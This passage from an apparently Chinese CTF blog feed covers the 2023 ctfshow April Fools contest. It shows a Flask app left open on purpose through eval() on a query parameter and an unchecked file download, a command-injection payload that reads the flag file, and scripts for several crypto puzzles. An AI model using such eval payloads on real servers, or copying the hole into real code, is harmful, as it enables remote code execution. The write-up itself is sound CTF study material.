string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'loggedin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username            session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span> <span class="token operator">=</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'profile'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg <span class="token operator">=</span> <span class="token string">'Incorrect username/password!'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login2.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> <span class="token string">''</span>     <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> <span class="token string">'username'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form <span class="token keyword">and</span> <span class="token string">'password'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token keyword">in</span> users<span class="token punctuation">:</span>            msg <span class="token operator">=</span> <span class="token string">'Account already exists!'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">'role'</span><span class="token punctuation">:</span> <span class="token string">'user'</span><span class="token punctuation">&#125;</span>            msg <span class="token operator">=</span> <span class="token string">'You have successfully registered!'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register2.html'</span><span class="token punctuation">,</span> msg<span class="token operator">=</span>msg<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile2.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> role<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">'role'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/show/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'show2.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'loggedin'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'filename'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>                          <span class="token keyword">return</span> send_file<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"hello,</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">pass</span>            <span class="token keyword">return</span> <span class="token string">"hello"</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'loggedin'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'role'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#发现这里有个get传参</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'eval'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"hello,</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">pass</span>            <span class="token keyword">return</span> <span class="token string">"hello"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试直接用system popen不可以</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hello<span class="token operator">/</span>?<span class="token builtin">eval</span><span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"cat%20/flag_is_h3re"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/06/2023-ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/image-20230406230240697.png" alt="image-20230406230240697"></p><p>ctfshow{cd88f1de-5346-44da-9eb3-a82257e447ba}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ezbase"><a href="#ezbase" class="headerlink" title="ezbase"></a>ezbase</h2><pre class="line-numbers language-none"><code class="language-none">4C455A5645334C44474A55484D5A42544F5132574956525A50464E464F4E4C474D4656454D334359474A554751564B4949493255535532464E42544643504A35<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base16</p><pre class="line-numbers language-none"><code class="language-none">LEZVE3LDGJUHMZBTOQ2WIVRZPFNFONLGMFVEM3CYGJUGQVKIII2USU2FNBTFCPJ5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32</p><pre class="line-numbers language-none"><code class="language-none">Y3Rmc2hvd3t5dV9yZW5fajFlX2hhUHB5ISEhfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64</p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;yu_ren_j1e_haPpy!!!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="comedy"><a href="#comedy" class="headerlink" title="comedy"></a>comedy</h2><p>A &#x3D; 2022  -  2023*m  %B</p><p>leak &#x3D; 2**2023  % B</p><p>2023*m - 2022 +A  $\equiv$ 0 %B</p><p>2**2023 - leak $\equiv$ 0 %  B</p><p>2023<em>m - 2022 + A &#x3D; B</em>i</p><p>2*<em>2023 - leak &#x3D; B</em>j</p><p>B&#x3D;gcd(2023*m - 2022  +A,2**2023 - leak)</p><p>构造多项式环</p><p>f &#x3D; 2023*m - 2022 +A</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnum<span class="token keyword">import</span> gmpy2KB<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2023</span><span class="token punctuation">)</span><span class="token operator">-</span>leakA<span class="token operator">=</span><span class="token number">493275281479560936332761096886786925792234184811353209227551802099268192839677496844153534128991899414803550843408607188612593757622064753867565869035222715177143938385039508273050267347710495512806264863554858016145161165422812554800693811328453743229819656381224407015421235005940088439590887928051969351426291843586132741521121351667152673680122929827805479163871436776753859965413192837591532468372</span>leak<span class="token operator">=</span><span class="token number">238829196127128263156194898141748280130190920343265228257398802867203846004703877952990524473329125233083096275276064071930416561616135910190674099345267027039386328203653489152769309498199556401574021633071022874689081585677578010276529507102304828451681000682208089162940529052283763507244593173690786957816545746540436261888398732172965945762569416702401859253725696471593023885944262561159982327952</span>PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>m<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>KB<span class="token punctuation">)</span><span class="token punctuation">)</span>f <span class="token operator">=</span> <span class="token number">2023</span><span class="token operator">*</span>m <span class="token operator">-</span> <span class="token number">2022</span> <span class="token operator">+</span> Af<span class="token operator">=</span>f<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token operator">=</span>f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span><span class="token number">200</span><span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>m<span class="token operator">=</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>B<span class="token operator">=</span>gcd<span class="token punctuation">(</span>KB<span class="token punctuation">,</span> <span class="token number">2023</span><span class="token operator">*</span>m <span class="token operator">-</span> <span class="token number">2022</span> <span class="token operator">+</span> A<span class="token punctuation">)</span>flag1<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag2<span class="token operator">=</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>B<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag1<span class="token operator">+</span>flag2<span class="token punctuation">)</span><span class="token comment">#ctfshow&#123;UNKNOWN_MODULUS_T0_BR1NG_L3UGHTER_AND_J@Y_TO_TH3_W0RLD&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="大牛的密码"><a href="#大牛的密码" class="headerlink" title="大牛的密码"></a>大牛的密码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">S_BOX<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span>c <span class="token operator">=</span>   <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">]</span>INV_S_BOX<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span>S_BOX<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>S_BOX<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>INV_S_BOX<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decrypt1</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            m<span class="token operator">=</span><span class="token punctuation">[</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> INV_S_BOX<span class="token punctuation">]</span>        <span class="token keyword">return</span> mm<span class="token operator">=</span>decrypt1<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ctfshow&#123;y0u_c5n_make_y0u1_own_CryptO&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="mini-ecc"><a href="#mini-ecc" class="headerlink" title="mini_ecc"></a>mini_ecc</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">p <span class="token operator">=</span> <span class="token number">71397796933602469825964946338224836258949974632540581233301840806613437378503</span>a <span class="token operator">=</span> <span class="token number">106105288190268015217241182934677375171023341761047638573248022053052499733117</span>b <span class="token operator">=</span> <span class="token number">76170541771321874396004434442157725545076211607587599314450304327736999807927</span>k <span class="token operator">=</span> <span class="token number">58155941823118858940343657716409231510854647214870891375273032214774400828217</span>w2 <span class="token operator">=</span> <span class="token number">16315249811700998894876359855091105114973337718373913477026230968747515636405</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>E <span class="token operator">=</span> EllipticCurve<span class="token punctuation">(</span>GF<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span><span class="token punctuation">)</span>Y <span class="token operator">=</span> E<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">33237936857741483513705672980652927705102229733798436323453609986072499230366</span><span class="token punctuation">,</span><span class="token number">52619411226266177137991318059937693955038910547834999771526408984808553907338</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> E<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">37414446283406201193977113266234367761786780230360175925999700345196415953455</span> <span class="token punctuation">,</span> <span class="token number">17037724145039910971426670298726906655653040365428438334942732090559637519851</span><span class="token punctuation">]</span><span class="token punctuation">)</span>c2 <span class="token operator">=</span> E<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">60560423732267272277570046154733119097475794979191838027420415113112056962844</span> <span class="token punctuation">,</span><span class="token number">54372226143125971429691267751299496959531971082475860532181772357190222938465</span><span class="token punctuation">]</span><span class="token punctuation">)</span>d<span class="token operator">=</span>inverse_mod<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span>E<span class="token punctuation">.</span>order<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>X<span class="token operator">=</span>Y<span class="token operator">*</span>dflag1<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>X<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">4585</span><span class="token punctuation">)</span>m<span class="token operator">=</span>c1 <span class="token operator">-</span> <span class="token punctuation">(</span>c2 <span class="token operator">*</span> k<span class="token punctuation">)</span>flag2<span class="token operator">=</span>w2<span class="token operator">//</span>m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag1<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ctfshow&#123;the_answer_is_it&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="easy-xor"><a href="#easy-xor" class="headerlink" title="easy_xor"></a>easy_xor</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> libnumc1 <span class="token operator">=</span> <span class="token number">151198307301713399973545627808177783191262282577048906899567665485020342464366268384613589477129150406859219553325982275344405383612415523342568367197935454935162234419239807109194526080836070453102172720442102673200212658553214847476648456720629906051324248179394810385918370092764118401652990951968387233220</span>c2 <span class="token operator">=</span> <span class="token number">7894512574379281106340582833782408137686355961537832816105517328532111343730615739255485918919146012721446905489729048235088965936700563973759759039693443386542070451737445467143517377017890468837697907596398070608179281207203217576205857817411996178441661371846647602166663752324880657668362355493701482869858528298247422875427747085642627978367348931707497113936723122393282697211257939351221141536029828744507560524637999804394951722319070365576391442828074457050403771353328835153787572457070779602728359333021922987279454923820866436212282592764768470608545881718922440010751845730974331917142224339664090863915</span>n <span class="token operator">=</span> <span class="token number">20873587976264698212013861921447267548758723109929620330136081844796427967720295581580927324390713931549639540337285515365487607593546367886570408812338077846317206794057714877394609181224434104303259411081376607299962306250984285173463537669954845497211859940191392861121877814873939865829555350848523691546006073264112091406848179785659505299775196062799482197712761744192962658799557108701192680225134300686608396391566674966897700511638643429161735764600752699251493599533703928135311599575989253347234975026924804433742500175666009324057320386262109587593814197687132304704244158862263859846356497849518103755981</span>pbits<span class="token operator">=</span><span class="token number">256</span>c3<span class="token operator">=</span><span class="token punctuation">(</span>c1<span class="token operator">>></span>pbits<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>pbitsPR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token operator">=</span>c3<span class="token operator">+</span>x<span class="token comment"># f=f.monic()</span>root<span class="token operator">=</span>f<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>pbits<span class="token punctuation">,</span>beta<span class="token operator">=</span><span class="token number">0.4</span><span class="token punctuation">)</span>p<span class="token operator">=</span>c3<span class="token operator">+</span>root<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m<span class="token operator">=</span>c1<span class="token punctuation">.</span>__xor__<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>libnum<span class="token punctuation">.</span>n2s<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ctfshow&#123;m_xor_p_but_coppersmith&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2023ctfshow愚人杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础</title>
      <link href="/2023/03/22/Linux%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/03/22/Linux%E5%9F%BA%E7%A1%80/</url>
      
